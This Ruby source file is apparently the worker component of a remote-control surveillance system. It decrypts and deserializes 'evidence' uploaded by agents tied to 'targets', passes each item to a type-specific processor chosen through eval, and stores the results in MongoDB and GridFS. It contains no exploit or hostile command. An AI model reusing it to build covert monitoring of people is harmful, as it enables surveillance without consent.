require_relative 'audio_processor'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence'

if File.directory?(Dir.pwd + '/lib/rcs-worker-release')
  require 'rcs-db-release/config'
  require 'rcs-db-release/db_layer'
  require 'rcs-db-release/grid'
else
  require 'rcs-db/config'
  require 'rcs-db/db_layer'
  require 'rcs-db/grid'
end

require 'mongo'

# specific evidence processors
Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
  require file
end

module RCS
module Worker

class InstanceProcessor
  include RCS::Tracer
  
  SLEEP_TIME = 10
  
  def initialize(instance, ident)
    @evidences = []
    @state = :stopped
    @seconds_sleeping = 0
    
    # get info about the agent instance from evidence db
    #@db = Mongo::Connection.new(RCS::DB::Config.instance.global['CN'], 27017).db("rcs")
    @agent = Item.agents.where({ident: ident, instance: instance}).first
    
    #@info = RCS::EvidenceManager.instance.instance_info @id
    raise "Agent \'#{ident}:#{instance}\' cannot be found." if @agent.nil?
    
    trace :info, "Created processor for agent #{@agent['ident']}:#{@agent['instance']}"
    
    # the log key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    trace :debug, "Evidence key #{@agent['logkey']}"
    @key = Digest::MD5.digest @agent['logkey']
    
    #@call_processor = CallProcessor.new
  end
  
  def resume
    @state = :running
    #RCS::EvidenceManager.instance.sync_status({:instance => @agent['instance']}, RCS::EvidenceManager::SYNC_PROCESSING)
    @seconds_sleeping = 0
  end
  
  def take_some_rest
    sleep 1
    @seconds_sleeping += 1
    #trace :debug, "processor #{@id} takes some sleep [slept #{@seconds_sleeping} seconds]."
  end
  
  def put_to_sleep
    @state = :stopped
    #RCS::EvidenceManager.instance.sync_status({:instance => @agent['instance']}, RCS::EvidenceManager::SYNC_IDLE)
    trace :debug, "processor #{self.object_id} is sleeping too much, let's stop!"
  end
  
  def finished?
    @state == :stopped
  end
  
  def sleeping_too_much?
    @seconds_sleeping >= SLEEP_TIME
  end
  
  def queue(id)
    @evidences << id unless id.nil?
    trace :info, "queueing evidence id #{id} for agent #{@agent['instance']}"

    process = Proc.new do
      resume
      
      until sleeping_too_much?
        until @evidences.empty?
          resume
          evidence_id = @evidences.shift

          begin
            start_time = Time.now
            
            # get binary evidence
            data = RCS::DB::GridFS.get(BSON::ObjectId(evidence_id), "evidence")
                        
            raise "Empty evidence" if data.nil?
            
            # deserialize binary evidence
            evidences = RCS::Evidence.new(@key).deserialize(data.read)
            if evidences.nil?
              trace :debug, "error deserializing evidence #{evidence_id} for agent #{@agent['instance']}, skipping ..."
              next
            end
            
            trace :debug, "Processing #{evidences.length} evidence(s)."
            
            evidences.each do |evidence|
              
              # store evidence_id inside evidence, we need it inside processors
              evidence.info[:db_id] = evidence_id
              
              # delete empty evidences
              if evidence.empty?
                #RCS::EvidenceManager.instance.del_evidence(evidence.info[:db_id], @agent['instance'])
                trace :debug, "deleted empty evidence for agent #{@agent['instance']}"
                next
              end
              
              # store agent instance in evidence (used when storing into db)
              evidence.info[:instance] = @agent['instance']
              
              trace :debug, "Processing evidence of type #{evidence.info[:type]}"
              
              # find correct processing module and extend evidence
              mod = "#{evidence.info[:type].to_s.capitalize}Processing"
              evidence.extend eval mod if RCS.const_defined? mod.to_sym
              evidence.process if evidence.respond_to? :process
              
              # override original type
              evidence.info[:type] = evidence.type
              
              #store_evidence evidence
              evidence.store
              
              processing_time = Time.now - start_time
              trace :info, "processed #{evidence.info[:type].upcase} in #{processing_time} sec"
            end

            RCS::DB::GridFS.delete(BSON::ObjectId(evidence_id), "evidence")
            trace :debug, "deleted raw evidence #{evidence_id}"
            
          rescue EvidenceDeserializeError => e
            trace :warn, "[#{@agent['instance']}] decoding failed for #{evidence_id}: " << e.to_s
            # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
          rescue Exception => e
            trace :fatal, "FAILURE: " << e.to_s
            trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
          end
        end
        take_some_rest
      end
      
      put_to_sleep
    end
    
    if finished?
      trace :debug, "deferring work for #{@agent['instance']}"
      EM.defer process
    end
  end
  
  def to_s
    "instance #{@agent['instance']}: #{@evidences.size}"
  end
  
  def store_evidence(evidence)
        
    # retrieve the target and the dynamic collection for the evidence
    agent = ::Item.agents.where({instance: evidence.info[:instance]}).first

    trace :debug, "found agent #{agent._id} for instance #{evidence.info[:instance]}"

    target = agent.get_parent
    
    trace :debug, "found target #{target._id} for agent #{agent._id}"
    
    ev = ::Evidence.dynamic_new target[:_id].to_s
    
    ev.item = [ agent[:_id] ]
    ev.type = evidence.info[:type]
    
    ev.acquired = evidence.info[:acquired].to_i
    ev.received = evidence.info[:received].to_i
    ev.relevance = 1
    ev.blotter = false
    ev.note = ""
    
    ev.data = evidence.info[:data]
    
    # save the binary data (if any)
    unless evidence.info[:grid_content].nil?
      ev.data[:_grid_size] = evidence.info[:grid_content].bytesize
      ev.data[:_grid] = RCS::DB::GridFS.put(evidence.info[:grid_content], {filename: agent[:_id].to_s}, target[:_id].to_s) unless evidence.info[:grid_content].nil?
    end

    ev.save
    
    trace :debug, "saved evidence #{ev._id}"
  end
  
end

end # ::Worker
end # ::RCS
